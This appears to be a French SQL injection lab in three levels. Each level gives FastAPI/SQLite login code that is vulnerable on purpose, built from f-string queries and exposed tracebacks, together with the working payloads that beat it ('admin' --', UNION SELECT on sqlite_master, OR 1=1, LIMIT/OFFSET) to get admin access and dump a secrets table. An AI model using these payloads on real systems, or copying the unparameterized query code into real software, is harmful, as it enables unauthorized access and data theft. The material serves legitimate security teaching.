# Niveau 1: comme la démo

- Pour juste se login en admin:
username: `admin' --`

Pour les gourmands:
- Pour en plus obtenir d'autres infos de la db, il faut déjà savoir quelle type de db c'est, pour ça il suffit de trigger une erreur
username: `'` -> affichage d'une erreur qui mentionne SQLITE3

    une petite recherche google indique que pour obtenir la liste des tables ne sqlite3, on peut faire `SELECT name FROM sqlite_master WHERE type = 'table'`

    donc on tente

    username: `' UNION SELECT name FROM sqlite_master WHERE type = 'table'`

- là il est pas content car il n'y a pas assez de colonne sélectionnées. pas grave, on ajoute des colonnes bidon jusqu'à ce que ça 
username: `' UNION SELECT name, "lalala", "lalala" FROM sqlite_master WHERE type = 'table'`

- maintenant bam
username: `' UNION SELECT * FROM table_super_secrete --`

```python
from fastapi import FastAPI, Request
import sqlite3
from fastapi.responses import HTMLResponse
import traceback

app = FastAPI()

# Initialize DB with users and secrets tables
def init_db():
    conn = sqlite3.connect("test.db")
    cursor = conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS users")
    cursor.execute("DROP TABLE IF EXISTS table_super_secrete")
    cursor.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    """)
    cursor.execute("""
        CREATE TABLE table_super_secrete (
            id INTEGER PRIMARY KEY,
            key TEXT NOT NULL,
            value TEXT NOT NULL
        )
    """)
    cursor.execute("INSERT INTO users (username, password) VALUES ('admin', 'secret123')")
    cursor.execute("INSERT INTO users (username, password) VALUES ('user1', 'password1')")
    cursor.execute("INSERT INTO table_super_secrete (key, value) VALUES ('api_key_super_secrete', 'supersecret123')")
    cursor.execute("INSERT INTO table_super_secrete (key, value) VALUES ('mwehehe', 'hee hee hee haa')")
    conn.commit()
    conn.close()

init_db()

# --- Helper function to generate HTML table ---
def generate_html_table(cursor, results):
    column_names = [description[0] for description in cursor.description]
    html = """
    <table border='1' style='border-collapse: collapse; width: 100%; margin-top: 10px;'>
        <tr style='background-color: #f2f2f2;'>
    """
    for col in column_names:
        html += f"<th style='padding: 8px; text-align: left;'>{col}</th>"
    html += "</tr>"
    for row in results:
        html += "<tr>"
        for value in row:
            html += f"<td style='padding: 8px;'>{value}</td>"
        html += "</tr>"
    html += "</table>"
    return html

# --- Vulnerable endpoint (POST, displays errors) ---
@app.post("/login")
async def login(request: Request):
    try:
        form_data = await request.form()
        username = form_data.get("username", "")
        query = f"SELECT * FROM users WHERE username = '{username}'"
        print(query)
        conn = sqlite3.connect("test.db")
        cursor = conn.cursor()
        cursor.execute(query)
        results = cursor.fetchall()
        html_table = generate_html_table(cursor, results)
        conn.close()
        return HTMLResponse(f"""
            <h1>Bouhouhou site super secure</h1>
            <h2>Query Results:</h2>
            {html_table}
        """)
    except Exception as e:
        return HTMLResponse(f"""
            <h1>Bouhouhou site super secure</h1>
            <h2 style="color: red;">Error:</h2>
            <p style="color: red;">{traceback.format_exc()}</p>""")

# --- HTML form (POST) ---
@app.get("/")
def read_root():
    return HTMLResponse("""
        <h1>Bouhouhou site super secure</h1>
        <h2>Login:</h2>
        <form action="/login" method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    """)

```


# Niveau 2

Ici, la requête est de la forme
```sql
SELECT * FROM users WHERE password='{hashed_password}' AND username='{username}'
```

Donc aucun contrôle sur le mdp, juste sur le username. Il faut donc crafter une requête en utilisant un `OR 1=1`

```python
from fastapi import FastAPI, Request
import sqlite3
from fastapi.responses import HTMLResponse
import traceback
import hashlib

app = FastAPI()

# Hash password (SHA-256 for demo)
def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

# Initialize DB with users and super-secret table
def init_db():
    conn = sqlite3.connect("test.db")
    cursor = conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS users")
    cursor.execute("DROP TABLE IF EXISTS table_super_secrete")
    cursor.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    """)
    cursor.execute("""
        CREATE TABLE table_super_secrete (
            id INTEGER PRIMARY KEY,
            key TEXT NOT NULL,
            value TEXT NOT NULL
        )
    """)
    # Insert users with hashed passwords
    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)",
                   ("user1", hash_password("password1")))
    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)",
                   ("admin", hash_password("secret123")))
    cursor.execute("INSERT INTO table_super_secrete (key, value) VALUES ('api_key_super_secrete', 'supersecret123')")
    cursor.execute("INSERT INTO table_super_secrete (key, value) VALUES ('mwehehe', 'hee hee hee haa')")
    conn.commit()
    conn.close()

init_db()

# --- Helper function to generate HTML table ---
def generate_html_table(cursor, results):
    column_names = [description[0] for description in cursor.description]
    html = """
    <table border='1' style='border-collapse: collapse; width: 100%; margin-top: 10px;'>
        <tr style='background-color: #f2f2f2;'>
    """
    for col in column_names:
        html += f"<th style='padding: 8px; text-align: left;'>{col}</th>"
    html += "</tr>"
    for row in results:
        html += "<tr>"
        for value in row:
            html += f"<td style='padding: 8px;'>{value}</td>"
        html += "</tr>"
    html += "</table>"
    return html

# --- Vulnerable endpoint (POST, hashed password, OR injection required) ---
@app.post("/login")
async def login(request: Request):
    try:
        form_data = await request.form()
        username = form_data.get("username", "")
        password = form_data.get("password", "")
        hashed_password = hash_password(password)
        query = f"SELECT * FROM users WHERE password='{hashed_password}' AND username='{username}'"
        print(query)  # For debugging
        conn = sqlite3.connect("test.db")
        cursor = conn.cursor()
        cursor.execute(query)
        results = cursor.fetchall()
        if len(results) == 0:
            conn.close()
            return HTMLResponse(f"""
                <h1>Bouhouhou mauvais mot de passe !</h1>
            """)
        html_table = generate_html_table(cursor, results)
        conn.close()
        return HTMLResponse(f"""
            <h1>Bouhouhou site super secure</h1>
            <h2>Query Results:</h2>
            {html_table}
        """)
    except Exception as e:
        return HTMLResponse(f"""
            <h1>Bouhouhou site super secure</h1>
            <h2 style="color: red;">Error:</h2>
            <p style="color: red;">{traceback.format_exc()}</p>
        """)

# --- HTML form (POST) ---
@app.get("/")
def read_root():
    return HTMLResponse("""
        <h1>Bouhouhou site super secure</h1>
        <h2>Login:</h2>
        <form action="/login" method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    """)
```


# Niveau 3

Ici, le serveur refuse la connexion dès qu'il y a plus que 1 résultat après la requête.


Et il y a tjr aucun contrôle sur le mdp, juste sur le username. Il faut donc crafter une requête en utilisant un `OR 1=1 and username='admin' --` pour ne récupérer que l'utilisateur admin.

on peut aussi s'en sortir avec `LIMIT` et `OFFSET`

(Difficulté extra pour les gourmands: on peut renommer le champ username en username_lalalalala (donc impossible à deviner), ils devront utiliser des UNION avec LIMIT et OFFSET pour obtenir les noms des champs de la DB item par item)

```python
from fastapi import FastAPI, Request
import sqlite3
from fastapi.responses import HTMLResponse
import traceback
import hashlib

app = FastAPI()

# Hash password (SHA-256 for demo)
def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

# Initialize DB with users and super-secret table
def init_db():
    conn = sqlite3.connect("test.db")
    cursor = conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS users")
    cursor.execute("DROP TABLE IF EXISTS table_super_secrete")
    cursor.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    """)
    cursor.execute("""
        CREATE TABLE table_super_secrete (
            id INTEGER PRIMARY KEY,
            key TEXT NOT NULL,
            value TEXT NOT NULL
        )
    """)
    # Insert users with hashed passwords
    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)",
                   ("user1", hash_password("password1")))
    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)",
                   ("admin", hash_password("secret123")))
    cursor.execute("INSERT INTO table_super_secrete (key, value) VALUES ('api_key_super_secrete', 'supersecret123')")
    cursor.execute("INSERT INTO table_super_secrete (key, value) VALUES ('mwehehe', 'hee hee hee haa')")
    conn.commit()
    conn.close()

init_db()

# --- Helper function to generate HTML table ---
def generate_html_table(cursor, results):
    column_names = [description[0] for description in cursor.description]
    html = """
    <table border='1' style='border-collapse: collapse; width: 100%; margin-top: 10px;'>
        <tr style='background-color: #f2f2f2;'>
    """
    for col in column_names:
        html += f"<th style='padding: 8px; text-align: left;'>{col}</th>"
    html += "</tr>"
    for row in results:
        html += "<tr>"
        for value in row:
            html += f"<td style='padding: 8px;'>{value}</td>"
        html += "</tr>"
    html += "</table>"
    return html

# --- Vulnerable endpoint (POST, hashed password, OR injection required) ---
@app.post("/login")
async def login(request: Request):
    try:
        form_data = await request.form()
        username = form_data.get("username", "")
        password = form_data.get("password", "")
        hashed_password = hash_password(password)
        query = f"SELECT * FROM users WHERE password='{hashed_password}' AND username='{username}'"
        print(query)  # For debugging
        conn = sqlite3.connect("test.db")
        cursor = conn.cursor()
        cursor.execute(query)
        results = cursor.fetchall()
        if len(results) == 0:
            conn.close()
            return HTMLResponse(f"""
                <h1>Bouhouhou mauvais mot de passe !</h1>
            """)
        if len(results) > 1:
            conn.close()
            return HTMLResponse(f"""
                <h1>ERREUR: {len(results)} résultats ont été trouvés</h1>
                <h3>C'est suspicieux, annulation immédiate de la requête par sécurité</h3>
            """)
        html_table = generate_html_table(cursor, results)
        conn.close()
        return HTMLResponse(f"""
            <h1>Bouhouhou site super secure</h1>
            <h2>Query Results:</h2>
            {html_table}
        """)
    except Exception as e:
        return HTMLResponse(f"""
            <h1>Bouhouhou site super secure</h1>
            <h2 style="color: red;">Error:</h2>
            <p style="color: red;">{traceback.format_exc()}</p>
        """)

# --- HTML form (POST) ---
@app.get("/")
def read_root():
    return HTMLResponse("""
        <h1>Bouhouhou site super secure</h1>
        <h2>Login:</h2>
        <form action="/login" method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    """)
```
